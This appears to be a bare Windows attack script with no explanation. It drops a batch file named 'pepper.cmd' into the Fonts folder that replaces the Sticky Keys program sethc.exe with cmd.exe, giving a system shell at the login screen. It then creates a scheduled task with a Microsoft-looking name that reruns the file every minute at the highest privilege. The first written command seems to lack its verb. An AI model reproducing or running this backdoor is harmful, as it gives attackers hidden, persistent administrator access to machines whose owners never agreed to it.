Write-Output "c:\Windows\System32\sethc.exe c:\Windows\System32\chtes.old && del c:\Windows\System32\sethc.exe && copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe" | Out-File 'c:\Windows\Fonts\pepper.cmd'

SCHTASKS /CREATE /SC MINUTE /TN MICROSOFT\Windows\WCM\Nettask /TR C:\Windows\Fonts\pepper.cmd /RL HIGHEST